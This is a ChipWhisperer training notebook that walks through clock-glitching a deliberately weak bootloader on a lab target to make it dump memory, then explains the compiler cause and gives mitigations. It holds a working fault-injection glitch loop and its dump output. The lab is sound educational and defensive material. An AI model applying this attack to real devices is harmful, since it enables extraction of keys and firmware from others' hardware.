# Part 1, Topic 3: Clock Glitching to Dump Memory (MAIN)

---
NOTE: This lab references some (commercial) training material on [ChipWhisperer.io](https://www.ChipWhisperer.io). You can freely execute and use the lab per the open-source license (including using it in your own courses if you distribute similarly), but you must maintain notice about this source location. Consider joining our training course to enjoy the full experience.

---

**SUMMARY:** *In the previous lab, we learned how clock glitching can be used to get a microcontroller to skip a password check. In this lab, we'll see if we can glitch a more realistic target: a bootloader's command response.*

**LEARNING OUTCOMES:**

* Applying previous glitch settings to new firmware
* Checking for success and failure when glitching
* Understanding how compiler optimizations can cause devices to behave in strange ways

## The Situation

Now that we've got our feet wet with glitching, we're going to try something a bit more realistic: an "encrypted" bootloader (it's actually just rot-13, but we'll pretend it's unbreakable encryption), where we make as few assumptions as possible. Our goal will be to get that bootloader to decrypt the data and send it back to us. Here's what we know about the bootloader:

1. The `'p'` command is used to write encrypted firmware to the device. It takes in an encrypted ASCII-encoded string, terminated with a newline. Our first chunk of firmware is `"516261276720736265747267206762206f686c207a76797821"`.
1. It does *something* to it (presumably unencrypts it, authenticates it, etc. and writes it to memory)
1. It sends back an error code of `"r000000\n"`

Of immediate interest is that error code. That's the only time the bootloader communicates back with us, so attacking there is a good place to start. One thing that we'll assume is that we've got a trigger right before the error code is sent back to us. This is just a simple `trigger_high()` call, but we could also trigger on an IO line (better with the CW1200 Pro) or with a SAD trigger on a power trace (CW1200 Pro only). We've got a place to start, but let's see if we can learn more about the bootloader first.

We recommend using SimpleSerial V2 for this as, though the firmware doesn't use the simpleserial protocol, the faster baud rate will help speed up glitching.

In [1]:
SCOPETYPE = 'OPENADC'
PLATFORM = 'CWHUSKY'
SS_VER="SS_VER_2_1"

In [2]:
%%bash -s "$PLATFORM" "$SS_VER"
cd ../../../firmware/mcu/bootloader-glitch
make PLATFORM=$1 CRYPTO_TARGET=NONE -j SS_VER=$2

SS_VER set to SS_VER_2_1
SS_VER set to SS_VER_2_1
arm-none-eabi-gcc (15:10.3-2021.07-4) 10.3.1 20210621 (release)
Copyright (C) 2020 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.  There is NO
warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.

mkdir -p objdir-CWHUSKY 
.
Welcome to another exciting ChipWhisperer target build!!
.
.
.
.
.
Compiling:
Compiling:
Compiling:
.
Compiling:
Compiling:
-en     bootloader.c ...
-en     decryption.c ...
-en     .././simpleserial/simpleserial.c ...
Compiling:
.
-en     .././hal/hal.c ...
-en     .././hal//sam4s/startup_sam4s.c ...
-en     .././hal//sam4s/sam4s_hal.c ...
Compiling:
.
.
-en     .././hal//sam4s/uart.c ...
.
Compiling:
.
Compiling:
-en     .././hal//sam4s/pio.c ...
Compiling:
Compiling:
-en     .././hal//sam4s/system_sam4s.c ...
-en     .././hal//sam4s/pmc.c ...
-en     .././hal//sam4s/sysclk.c ...
-e Done!
-e Done!


bootloader.c: In function 'main':
bootloader.c:90:5: warning: implicit declaration of function 'hex_decode' [-Wimplicit-function-declaration]
   90 |     hex_decode(ascii_idx, (char*)ascii_buffer, data_buffer);
      |     ^~~~~~~~~~


-e Done!
-e Done!
-e Done!
-e Done!
-e Done!
-e Done!
-e Done!
-e Done!
-e Done!
.
LINKING:
-en     bootloader-CWHUSKY.elf ...
Memory region         Used Size  Region Size  %age Used
             rom:        2992 B       128 KB      2.28%
             ram:        4368 B        64 KB      6.67%
-e Done!
.
.
.
Creating load file for Flash: bootloader-CWHUSKY.hex
.
Creating load file for Flash: bootloader-CWHUSKY.bin
arm-none-eabi-objcopy -O ihex -R .eeprom -R .fuse -R .lock -R .signature bootloader-CWHUSKY.elf bootloader-CWHUSKY.hex
.
arm-none-eabi-objcopy -O binary -R .eeprom -R .fuse -R .lock -R .signature bootloader-CWHUSKY.elf bootloader-CWHUSKY.bin
Creating load file for EEPROM: bootloader-CWHUSKY.eep
Creating Extended Listing: bootloader-CWHUSKY.lss
arm-none-eabi-objcopy -j .eeprom --set-section-flags=.eeprom="alloc,load" \
--change-section-lma .eeprom=0 --no-change-warnings -O ihex bootloader-CWHUSKY.elf bootloader-CWHUSKY.eep || exit 0
arm-none-eabi-objdump -h -S -z bootloader-CW

In [3]:
%run "../../Setup_Scripts/Setup_Generic.ipynb"

INFO: Found ChipWhisperer😍
scope.gain.gain                          changed from 0                         to 22                       
scope.gain.db                            changed from 15.0                      to 25.091743119266056       
scope.adc.samples                        changed from 131124                    to 5000                     
scope.clock.clkgen_freq                  changed from 0                         to 7363636.363636363        
scope.clock.adc_freq                     changed from 0                         to 29454545.454545453       
scope.clock.adc_rate                     changed from 0.0                       to 29454545.454545453       
scope.io.tio1                            changed from serial_tx                 to serial_rx                
scope.io.tio2                            changed from serial_rx                 to serial_tx                
scope.io.hs2                             changed from None                      to clkgen            

In [4]:
fw_path = "../../../firmware/mcu/bootloader-glitch/bootloader-{}.hex".format(PLATFORM)

In [5]:
cw.program_target(scope, prog, fw_path)

The first thing we'll do is some simple power analysis to see what the device is doing when it sends data back to us. Serial communication is pretty slow, so set the ChipWhisperer to capture around 24k samples with a "x1" ADC clock.

In [6]:
def reboot_flush():            
    reset_target(scope)
    #Flush garbage too
    target.flush()
scope.clock.adc_src = "clkgen_x1"
reboot_flush()
scope.adc.samples = 24000

(ChipWhisperer Scope WARNING|File ChipWhispererHuskyClock.py:1653) scope.clock.adc_src is provided for backwards compability, but scope.clock.clkgen_src and scope.clock.adc_mul should be used for Husky.
(ChipWhisperer Scope WARNING|File ChipWhispererHuskyClock.py:704) Target clock may drop; you may need to reset your target.


Next, capture a power trace. The string `"p516261276720736265747267206762206f686c207a76797821\n"` will send the bootloader the first chunk of code and plot it. If you don't see the full serial message, you can increase `scope.adc.decimate`, which will throw out every nth ADC sample.

In [7]:
scope.adc.timeout = 3
scope.arm()
target.write("p516261276720736265747267206762206f686c207a76797821\n")
ret = scope.capture()
if ret:
    print("Timeout")
trace = scope.get_last_trace()


cw.plot(trace)

:Curve   [x]   (y)

It doesn't look like anything too crazy is going on here - it's probably just printing some characters in a loop. Some ideas:

* If we glitch at the beginning of the loop, we might be able to corrupt the loop length variable and get it to print some extra memory
* We might be able to corrupt the loop variable and get it to read past where it's supposed to

For SimpleSerial V2, this should be short enough that you can quickly loop through the entirety of the code. If your target isn't using SimpleSerial V2, you should instead select a range a bit (~1000 cycles) before the end of the loop. If this doesn't succeed, you can try going after the cycles at the beginning of the loop.

**HINT: The last part of the loop should be near the beginning of the last power spike.**

**HINT: If you're really stuck on where the serial print ends, you can find the time between the `trigger_high()` and `trigger_low()` call with `scope.adc.trig_count`.**

In [8]:
print("trig_count:", scope.adc.trig_count)

# Scan across the whole print loop. Step of 20 samples is a starting point -
# if the scan below takes too long, raise this; if you want to zero in on a
# promising region once you've found one, lower it.
step = 20
glitch_spots = list(range(0, scope.adc.trig_count, step))

trig_count: 2158


In [9]:
print(glitch_spots)

[0, 20, 40, 60, 80, 100, 120, 140, 160, 180, 200, 220, 240, 260, 280, 300, 320, 340, 360, 380, 400, 420, 440, 460, 480, 500, 520, 540, 560, 580, 600, 620, 640, 660, 680, 700, 720, 740, 760, 780, 800, 820, 840, 860, 880, 900, 920, 940, 960, 980, 1000, 1020, 1040, 1060, 1080, 1100, 1120, 1140, 1160, 1180, 1200, 1220, 1240, 1260, 1280, 1300, 1320, 1340, 1360, 1380, 1400, 1420, 1440, 1460, 1480, 1500, 1520, 1540, 1560, 1580, 1600, 1620, 1640, 1660, 1680, 1700, 1720, 1740, 1760, 1780, 1800, 1820, 1840, 1860, 1880, 1900, 1920, 1940, 1960, 1980, 2000, 2020, 2040, 2060, 2080, 2100, 2120, 2140]


### Evaluating Success

Detecting whether our glitch was successful or not isn't quite as trivial as in the previous lab - we don't have a nice error return that the device calculates and sends back to us. One idea is that we can look for part of the string that we sent to the device: there isn't much time between us sending it and the error code being returned. With any luck the compiler will have placed both values close in memory.

Now the rest is up to you! Use what you learned in the previous lab to setup glitch settings and a glitch loop. Here's a few hints to make things easier:

1. Try to use a fairly small width and offset range since we'll need to scan ext_offset as well here. A total range of ~2-3 for each with 0.4 steps is a good range to aim for. These numbers are for CW-Lite/Pro; for CW-Husky, convert as per Fault 1_1.
1. Try looking for a part of the string we sent to the device to check for success.
1. You may want to forgo graphing or plot only successes/crashes if it makes things substantially slower - we're scanning a large range of glitch settings so we'll need all the speed we can get.

Set your glitch up here:

In [10]:
scope.adc.timeout = 0.1

scope.cglitch_setup()

def my_print(text):
    for ch in text:
        if (ord(ch) > 31 and ord(ch) < 127) or ch == "\n": 
            print(ch, end='')
        else:
            print("0x{:02X}".format(ord(ch)), end='')
        print("", end='')

(ChipWhisperer Scope WARNING|File ChipWhispererHuskyClock.py:704) Target clock may drop; you may need to reset your target.


scope.adc.samples                        changed from 24000                     to 5000                     
scope.clock.clkgen_freq                  changed from 7371428.571428572         to 7363636.363636363        
scope.clock.adc_mul                      changed from 1                         to 4                        
scope.clock.adc_freq                     changed from 7371428.571428572         to 29454545.454545453       
scope.clock.adc_rate                     changed from 7371428.571428572         to 29454545.454545453       


Again, we can use the glitch controller to make loop setup easier:

In [11]:
gc = cw.GlitchController(groups=["success", "reset", "normal"], parameters=["width", "offset", "ext_offset", "tries"])
gc.display_stats()

IntText(value=0, description='success count:', disabled=True)

IntText(value=0, description='reset count:', disabled=True)

IntText(value=0, description='normal count:', disabled=True)

FloatSlider(value=0.0, continuous_update=False, description='width setting:', disabled=True, max=10.0, readout…

FloatSlider(value=0.0, continuous_update=False, description='offset setting:', disabled=True, max=10.0, readou…

FloatSlider(value=0.0, continuous_update=False, description='ext_offset setting:', disabled=True, max=10.0, re…

FloatSlider(value=0.0, continuous_update=False, description='tries setting:', disabled=True, max=10.0, readout…

In [12]:
x_bound = (-48, 48)
y_bound = (glitch_spots[0], glitch_spots[-1])
if scope._is_husky:
    x_bound = gc.set_range("width", 3900, 4500)
gc.glitch_plot(plotdots={"success":"+g", "reset":"xr", "normal":None}, x_bound=x_bound, y_bound=y_bound,
               x_index="width", y_index="ext_offset")

Parameter name clashes for keys ['data'] 
Parameter name clashes for keys ['data'] 
Parameter name clashes for keys ['data']

:DynamicMap   []
   :Overlay
      .Points.I  :Points   [width,ext_offset]
      .Points.II :Points   [width,ext_offset]

In [13]:
broken = False

gc.set_range("width", 0, 600)
gc.set_range("offset", 2200, 2400)
gc.set_global_step([100, 50])

gc.set_range("ext_offset", glitch_spots[0], glitch_spots[-1])
gc.set_step("ext_offset", glitch_spots[1] - glitch_spots[0])
gc.set_range("tries", 1, 1)
gc.set_step("tries", 1)
scope.glitch.repeat = 1

for glitch_setting in gc.glitch_values():
    scope.glitch.offset = glitch_setting[1]
    scope.glitch.width = glitch_setting[0]
    scope.glitch.ext_offset = glitch_setting[2]
    if broken:
        break
    if scope.adc.state:
        gc.add("reset")
        reboot_flush()

    target.flush()
    scope.arm()
    target.write("p516261276720736265747267206762206f686c207a76797821\n")
    ret = scope.capture()
    if ret:
        gc.add("reset")
        reboot_flush()
    else:
        time.sleep(0.05)
        output = target.read(timeout=2)
        if len(output) > 10:   # normal error reply is short; a real dump is much longer
            print("Glitched!\n\tExt offset: {}\n\tOffset: {}\n\tWidth: {}".format(
                scope.glitch.ext_offset, scope.glitch.offset, scope.glitch.width))
            gc.add("success")
            broken = True
            for __ in range(500):
                num_char = target.in_waiting()
                if num_char:
                    my_print(output)
                    output = target.read(timeout=50)
            time.sleep(1)
            break
        else:
            gc.add("normal")

(ChipWhisperer Scope WARNING|File _OpenADCInterface.py:730) Timeout in OpenADC capture(), no trigger seen! Trigger forced, data is invalid. Status: 13
(ChipWhisperer Scope WARNING|File _OpenADCInterface.py:730) Timeout in OpenADC capture(), no trigger seen! Trigger forced, data is invalid. Status: 12


Glitched!
	Ext offset: 100
	Offset: 2300
	Width: 0
r0





6720736265747267206762206f686c207a767978210x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x00Don't forget to buy milk!0x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000xEE0xCF0x1B10x9B0x810xEE0xDA0x7F0xFA0xD10xAC0xFE0x1F@0xED0xF60x93[0xCB0xE40x8F2F0x0E:E0x000xD90x040xB90x1F/0xC9]U0xD20x9C$0x020xAE>0xF2N0xC90x980xB1/K0xCD0xA10xB4WQ0x100x920x0F0x80j0xDD0xDEB0xC2g0x0B0x020xA9e0xCA0x8B0xADwu0xA30xE7/0x960xE8#0xFD-0xEF0xEEy0x130xA2}0x93%0x920x000x110x16K0x96B0xFF0xE820xD1X0xA8U0xFC0xAA0xF40xCB0x080xFE0xD4}-0xF8%0xA440xB70x94T0x1F0xAB0x8C0xAA0x9

0xA80x0B0x840x080xBA@0x99n0xE1o0x940x170x060xE4K0x930xBD0xB90xDAqJ~EG?0xE90xA40xAD0x0D0x840xFE0xBE880xE10x92`^0xF7kq0xCC0x030xD6Ld0xD80xB6!0xB30x0E0xC8(0xF30xDC0xB20xB20xBE50xDA0xC40xDFy>0x090x8C9h0x9C][0x8C00xCE0xCB0xA00xF00xC20xDF0xFA_|ul80xCE[kgq0x9B0x92m0xEA0xF80x95\0xE70xF10x0B0x070xD50x130xCD0xB90x8EB0xF80x970x12THX0x7F0xD7VF0xF40x8480x9B0xC10x800xB680xF70x9B
PC0xB20xA90xE9W0x1C0x040xB0j0xD10x13$0x0E0xD40xE20xEF$0xC50xE70xA10xF40xEE0x03/W0xE00x070xDF80xBFQ/0x9A0xD5+0xD10xC2d0xF00x8F3J`0xE4r3-\0x1AJ0xFB0xB90xB50xDD0xFA0x030xAC
0xEF0xEF0x84yG0x9E0x030xBB)0xA00xA00xD30xC20x1A~:0xFA,0x9E0x1F0xDB0xEEL0x810x8B0xDD0x940x130x040xBF0x160xF80x8A0x070xFDG?0xD60xC90xAC0xBD{>0xC70}oJ0x94I0xF00xDD0xF40xCD&0x060xAE0xAD30xDAH0xCE0x8C0xE50x0C0x0D0xFE\:0x900x960xA80x850xF6<,r0xF5P0xD60xE45_H0xED0xD7o0xABT0x1F0x080xD0UD0xC00xEB0x93L'u0xB60xCD0x1B0xFA0x040xFCP#0x150xB4f0xA90x0800x1F0xE40xF8$k0x920x99w&0x9E
F0xCF?80x880xFB0x180x030xDB80xAA0x050xB7.Eb0xACE0x96R
0xA90x8D0x8B0x9Al40x1B0xCA0x82b0xB50xBD0

0xA20xF20xB80xBE0xB9'0xD40xCD0xE90x830xB80x8E0xD60x9EI0xA30x990x130xEA0xDDl0xD0/\0x160xC20xA10xBA0x950xA4w&0x98X0xBE0xD0o)0x16Z0xC00xF2% u60x8C0xF9p0xB90x1C0xA70x850x840x8DGI70xD00xA20xBB0xA930xB30x050xDE~0x920xDB}t0xC40x010xC60x99L0xFA(>0xA7vQ0xF5/0x100x9A80xA80xA80x8B0xE00xADinM0x16(Zl0xD1y0xAE0x170x00a<&0xFF0x0C0x170x020xFB0xAE0xECX0xD00xA4C0x86O0xB40x030xE20xA00x070xE10xB090xEB0xAE0x12n0x89&0xE90x9EY0xD8(1r0x1C/}x0xD00xC30xC0|0xCBK[Jx80xA2;l0xB00x900x100x980xC70xD10xD00x090x070xB40xF10x830x820x930xCA0xD90xF7:0x860xDC0x0D0x196]0xEE0xE70x97n0x1B0x0E'0x8D0xAD0xC00xED0x9D0xDF.E0xAD0xFBi0xA40x990xAF0x090xD7p0xF80xF30x1FQ0x8D0xD0`0x930x980xD60x9Ae80xC70x150x8D0xAFo.0xA50x9D0x1F=I0xBF0xE3R0xC20x180x960xFA)0x9DO0xCF&s0xD2>g0xC7Qb0xB8j0x070xBA}0xFE<0x88%VR0x190xCA0x1A0xE2t0x1E#0x80w0xBE(0x9D80xB30x81&0xEF0xE30x110x0B0xCD!0xE40x90/CwNS(0x150xAA0xE00xD80x14~0xD3*0x1DY0xDEt0x92b0xED70xB8r0xB1[c0xBF+c:0x830x810xBE0x120xDE40x990x8E0xD20x140x8F0xAC0xD10xB5?0xE5Y0x150xA20xED0xC7g0xFCg0xA8C0x180xEF

## Diagnosing the Fault

As you can see by the output, the bootloader has suffered a pretty catastrophic failure! Not only has it spilled the secret, it's also dumped a whole bunch more memory. For a real bootloader, there's probably some pretty juicy stuff in there like encryption keys or previously decrypted firmware. Let's start by taking a look at the C source code that sends the error code back:

```C
trigger_high();

int i;
for(i = 0; i < ascii_idx; i++)
{
    putch(ascii_buffer[i]);
}
trigger_low();
state = IDLE;
```

Nothing really looks too unusual here. Before we take a look at the assembly and figure out what went wrong, let's try to make some guesses:

* Maybe the glitch corrupted the `ascii_idx` variable
    * The glitch happened near the end of the loop. It's unlikely the end of loop counter would be reloaded during the loop
* Maybe we skipped the last `i < ascii_idx` check
    * The glitch caused **a lot** of memory to be dumped. If we just skipped the last check it **should** only print an extra character
* i is a signed integer: maybe we corrupted it into being a really large negative number.

That last one seems to be our best theory, so let's go with that.

## The Answer

Let's check the assembly for our booloader. No need to decompile the binary or recompile to assembly, since there's also a listing file created as part of the build process (`*.lss`). This file also contains C, so it makes it easy to search (try something like the `trigger_high()` call). You might notice that instead of doing a `less than or equal` or `less than` comparison like was in our C code, the compiler has instead inserted a `not equal` comparison instead! This means our original guess may not have been correct, as our assumption about what would happen if the last `i < ascii_idx` was skipped doesn't hold. In fact, it's a lot more likely that the last check was skipped (or i was set to some large value) than flipping a particular bit.

This is actually a pretty unexpected change for the compiler to make, espcially since `less than`, `greater than`, and `not equal` are nearly identical instructions in terms of implementation and have both the same instruction size and speed. This showcases an important fact: the C code that you write is not directly translated to assembly. It needs to go through the compiler first, which may drastically change the intended logic of the program.

Now that we know what happened, let's look at some ways to fix it.

### 1. Volatile variables

C includes a keyword for variables called `volatile`, which indicates that the variable may change between accesses and therefore should not have optimizations applied to it. A typical use case for `volatile` is for peripheral registers on embedded devices. It would be really bad, for example, if you were trying to wait for an IO pin to go high in your code, but the compiler decided it would be faster to only check it only once and assume it doesn't change!

Try replacing `int i = 0;` before the print look with `volatile int i = 0;`, recompile, and check the listing file. Is there any other unexpected changes? What about if you consider the use case above (i.e. if `i` was a register instead of a loop variable)? Is there any way the attack might still work? If so, how might you mitigate this?

### 2. Unrolling the loop

Another potential way of solving this issue would be to manually unroll the loop. The message being printed by the bootloader is a constant length of 7 characters, so we could instead write:

```C
int i;
putch(ascii_buffer[i++]);
putch(ascii_buffer[i++]);
putch(ascii_buffer[i++]);
putch(ascii_buffer[i++]);
putch(ascii_buffer[i++]);
putch(ascii_buffer[i++]);
putch(ascii_buffer[i++]);
```

In fact, this is something the compiler might do on its own to optimize the code, since unrolling a loop like this is faster than the loop version. It's not a good idea to blindly rely on this, however, since the compiler could choose not to make this optimization as well and might change it between builds.

### 3. Checking for invalid characters

Another thing to consider is that the message from the bootloader only has a limited range of characters that it prints. We could instead construct a "safe print" function that only prints newlines, `'r'` and ASCII digits (i.e. `'0'` to `'9'`):

```C
int safe_print(char c)
{
    if ((c == '\n') ||
       ((c >= '0') && (c <= '9')) ||
       (c == 'r')) {
        putch(c);
        return 0;
    }
    return -1; //uh oh!
}
```

It we went this route, it would be a good idea to make the error return a separate buffer with a bunch of null characters at the end.

### 4. More generic methods

More generic ways of defending against glitch attacks (memory guards, for example) are also discussed in the training slides.

In [14]:
scope.dis()
target.dis()